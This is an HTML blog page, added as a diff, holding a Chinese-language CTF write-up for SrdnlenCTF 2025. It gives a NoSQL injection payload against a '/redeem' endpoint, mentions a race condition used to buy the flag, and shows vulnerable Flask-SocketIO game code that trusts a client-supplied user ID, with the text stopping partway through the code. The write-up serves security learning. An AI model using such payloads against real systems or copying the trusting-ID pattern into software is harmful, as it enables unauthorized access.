@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>2025-SrdnlenCTF - N1Rvana&#39;s Blog</title><meta name="author" content="N1Rvana">
+<meta name="description" content="Web Security"><meta name="keywords" content='Java, CTF, Socket, nodejs'>
+  <meta itemprop="name" content="2025-SrdnlenCTF">
+  <meta itemprop="description" content="Web Security">
+  <meta itemprop="datePublished" content="2025-01-26T20:48:13+08:00">
+  <meta itemprop="dateModified" content="2025-01-26T20:48:13+08:00">
+  <meta itemprop="wordCount" content="662">
+  <meta itemprop="image" content="https://nlrvana.github.io/avatar.png">
+  <meta itemprop="keywords" content="Java,CTF,Socket,NodeJS"><meta property="og:url" content="https://nlrvana.github.io/2025-srdnlenctf/">
+  <meta property="og:site_name" content="N1Rvana&#39;s Blog">
+  <meta property="og:title" content="2025-SrdnlenCTF">
+  <meta property="og:description" content="Web Security">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-01-26T20:48:13+08:00">
+    <meta property="article:modified_time" content="2025-01-26T20:48:13+08:00">
+    <meta property="article:tag" content="Java">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="Socket">
+    <meta property="article:tag" content="NodeJS">
+    <meta property="og:image" content="https://nlrvana.github.io/avatar.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://nlrvana.github.io/avatar.png">
+  <meta name="twitter:title" content="2025-SrdnlenCTF">
+  <meta name="twitter:description" content="Web Security">
+      <meta name="twitter:site" content="@huahua39079406">
+<meta name="twitter:creator" content="@huahua39079406" /><meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://nlrvana.github.io/2025-srdnlenctf/" title="2025-SrdnlenCTF - N1Rvana&#39;s Blog" /><link rel="prev" type="text/html" href="https://nlrvana.github.io/java-jdbc-attack-h2/" title="Java JDBC Attack-H2" /><link rel="alternate" type="text/markdown" href="https://nlrvana.github.io/2025-srdnlenctf/index.md" title="2025-SrdnlenCTF - N1Rvana's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "2025-SrdnlenCTF",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/nlrvana.github.io\/2025-srdnlenctf\/"
+    },"genre": "posts","keywords": "Java, CTF, Socket, nodejs","wordcount":  662 ,
+    "url": "https:\/\/nlrvana.github.io\/2025-srdnlenctf\/","datePublished": "2025-01-26T20:48:13+08:00","dateModified": "2025-01-26T20:48:13+08:00","license": "Web Security","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "N1Rvana"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item has-children">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a><i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i>
+                <ul class="sub-menu"><li class="menu-item">
+                        <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li class="menu-item">
+                        <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li class="menu-item">
+              <a class="menu-link" href="/friends/"><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="关键词搜索" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="关键词搜索" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><span class="nested-item">
+                  <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a>
+                  <i class="dropdown-icon fa-solid fa-chevron-right" aria-hidden="true"></i>
+                </span>
+                <ul class="sub-menu"><li class="menu-item">
+                        <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li class="menu-item">
+                        <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item" data-separator="/"><a href="/" title="N1Rvana&#39;s Blog">Home</a></li><li class="breadcrumb-item" data-separator="/"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" data-separator="/" aria-current="page">2025-SrdnlenCTF</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><span>2025-SrdnlenCTF</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/avatar.png" alt="N1Rvana" data-title="N1Rvana" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;N1Rvana</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/ctf/" class="post-category" title="Category - CTF"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CTF</a></span></div><div class="post-meta-line"><span title="published on 2025-01-26 20:48:13"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-01-26">2025-01-26</time></span>&nbsp;<span title="662 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 700 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="2025-SrdnlenCTF"><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_page_pv">-</span>&nbsp;views
+          </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#speed">SPEED</a></li>
+    <li><a href="#sparklingsky">sparklingsky</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="speed" class="heading-element"><span>SPEED</span>
+  <a href="#speed" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>在<code>/redeem</code>存在<code>nosql</code>注入，<br>
+<code>payload: ?discountCode[$ne]=null</code><br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501202156035.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501202156035.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501202156035.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501202156035.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501202156035.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501202156035.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+并且存在并发，利用领取到金币，即可购买<code>flag</code><br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501202158036.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501202158036.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501202158036.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501202158036.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501202158036.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501202158036.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+购买<code>flag</code><br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501202159695.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501202159695.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501202159695.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501202159695.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501202159695.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202501202159695.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="sparklingsky" class="heading-element"><span>sparklingsky</span>
+  <a href="#sparklingsky" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>利用<code>websocket</code>实现了一个小游戏</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">from</span><span class="w"> </span><span class="n">flask_socketio</span><span class="w"> </span><span class="kn">import</span><span class="w"> </span><span class="nn">emit</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">from</span><span class="w"> </span><span class="n">flask_login</span><span class="w"> </span><span class="kn">import</span><span class="w"> </span><span class="nn">current_user</span><span class="p">,</span><span class="w"> </span><span class="n">login_required</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">from</span><span class="w"> </span><span class="n">threading</span><span class="w"> </span><span class="kn">import</span><span class="w"> </span><span class="nn">Lock</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">from</span><span class="w"> </span><span class="p">.</span><span class="na">models</span><span class="w"> </span><span class="kn">import</span><span class="w"> </span><span class="err">*  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">from</span><span class="w"> </span><span class="n">anticheat</span><span class="w"> </span><span class="kn">import</span><span class="w"> </span><span class="nn">log_action</span><span class="p">,</span><span class="w"> </span><span class="n">analyze_movement</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lock</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Lock</span><span class="p">()</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">def</span><span class="w"> </span><span class="nf">init_socket_events</span><span class="p">(</span><span class="n">socketio</span><span class="p">,</span><span class="w"> </span><span class="n">players</span><span class="p">):</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@socketio.on</span><span class="p">(</span><span class="err">&#39;</span><span class="n">connect</span><span class="err">&#39;</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@login_required</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">def</span><span class="w"> </span><span class="nf">handle_connect</span><span class="p">():</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">user_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">int</span><span class="p">(</span><span class="n">current_user</span><span class="p">.</span><span class="na">get_id</span><span class="p">())</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">log_action</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;is connecting&#34;</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">          
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="n">user_id</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">players</span><span class="p">.</span><span class="na">keys</span><span class="p">():</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="err">#</span><span class="w"> </span><span class="n">Player</span><span class="w"> </span><span class="n">already</span><span class="w"> </span><span class="n">exists</span><span class="p">,</span><span class="w"> </span><span class="n">send</span><span class="w"> </span><span class="n">their</span><span class="w"> </span><span class="n">current</span><span class="w"> </span><span class="n">position</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="nf">emit</span><span class="p">(</span><span class="err">&#39;</span><span class="n">connected</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="err">&#39;</span><span class="n">user_id</span><span class="err">&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">user_id</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;x&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">players</span><span class="o">[</span><span class="n">user_id</span><span class="o">][</span><span class="sc">&#39;x&#39;</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;y&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">players</span><span class="o">[</span><span class="n">user_id</span><span class="o">][</span><span class="sc">&#39;y&#39;</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="err">&#39;</span><span class="n">angle</span><span class="err">&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">players</span><span class="o">[</span><span class="n">user_id</span><span class="o">][</span><span class="err">&#39;</span><span class="n">angle</span><span class="err">&#39;</span><span class="o">]</span><span class="p">})</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">else</span><span class="p">:</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="err">#</span><span class="w"> </span><span class="n">TODO</span><span class="p">:</span><span class="w"> </span><span class="n">Check</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">lobby</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">full</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">add</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">player</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">queue</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="nf">log_action</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span><span class="w"> </span><span class="n">f</span><span class="s">&#34;is spectating&#34;</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">emit</span><span class="p">(</span><span class="err">&#39;</span><span class="n">update_bird_positions</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">players</span><span class="p">,</span><span class="w"> </span><span class="n">broadcast</span><span class="o">=</span><span class="n">True</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@socketio.on</span><span class="p">(</span><span class="err">&#39;</span><span class="n">move_bird</span><span class="err">&#39;</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@login_required</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">def</span><span class="w"> </span><span class="nf">handle_bird_movement</span><span class="p">(</span><span class="n">data</span><span class="p">):</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">user_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">data</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="err">&#39;</span><span class="n">user_id</span><span class="err">&#39;</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">log_action</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;is active&#34;</span><span class="p">)</span><span class="w">          
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="n">user_id</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">players</span><span class="p">:</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">del</span><span class="w"> </span><span class="n">data</span><span class="o">[</span><span class="err">&#39;</span><span class="n">user_id</span><span class="err">&#39;</span><span class="o">]</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="n">players</span><span class="o">[</span><span class="n">user_id</span><span class="o">]</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">data</span><span class="p">:</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">with</span><span class="w"> </span><span class="n">lock</span><span class="p">:</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">players</span><span class="o">[</span><span class="n">user_id</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="sc">&#39;x&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">data</span><span class="o">[</span><span class="sc">&#39;x&#39;</span><span class="o">]</span><span class="p">,</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="sc">&#39;y&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">data</span><span class="o">[</span><span class="sc">&#39;y&#39;</span><span class="o">]</span><span class="p">,</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="err">&#39;</span><span class="n">color</span><span class="err">&#39;</span><span class="p">:</span><span class="w"> </span><span class="err">&#39;</span><span class="n">black</span><span class="err">&#39;</span><span class="p">,</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="err">&#39;</span><span class="n">angle</span><span class="err">&#39;</span><span class="p">:</span><span class="w"> </span><span class="n">data</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="err">&#39;</span><span class="n">angle</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">log_action</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;is success&#34;</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="n">analyze_movement</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span><span class="w"> </span><span class="n">data</span><span class="o">[</span><span class="sc">&#39;x&#39;</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">data</span><span class="o">[</span><span class="sc">&#39;y&#39;</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">data</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="err">&#39;</span><span class="n">angle</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">)):</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">log_action</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span><span class="w"> </span><span class="n">f</span><span class="s">&#34;was cheating with final position ({data[&#39;x&#39;]}, {data[&#39;y&#39;]}) and final angle: {data[&#39;angle&#39;]}&#34;</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="err">#</span><span class="w"> </span><span class="n">del</span><span class="w"> </span><span class="n">players</span><span class="o">[</span><span class="n">user_id</span><span class="o">]</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="n">Remove</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">player</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">game</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">we</span><span class="w"> </span><span class="n">are</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">beta</span><span class="w"> </span><span class="n">so</span><span class="w"> </span><span class="n">idc</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="nf">emit</span><span class="p">(</span><span class="err">&#39;</span><span class="n">update_bird_positions</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">players</span><span class="p">,</span><span class="w"> </span><span class="n">broadcast</span><span class="o">=</span><span class="n">True</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@socketio.on</span><span class="p">(</span><span class="err">&#39;</span><span class="n">disconnect</span><span class="err">&#39;</span><span class="p">)</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@login_required</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">def</span><span class="w"> </span><span class="nf">handle_disconnect</span><span class="p">(</span><span class="n">data</span><span class="p">):</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">user_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">current_user</span><span class="p">.</span><span class="na">get_id</span><span class="p">()</span><span class="w">  
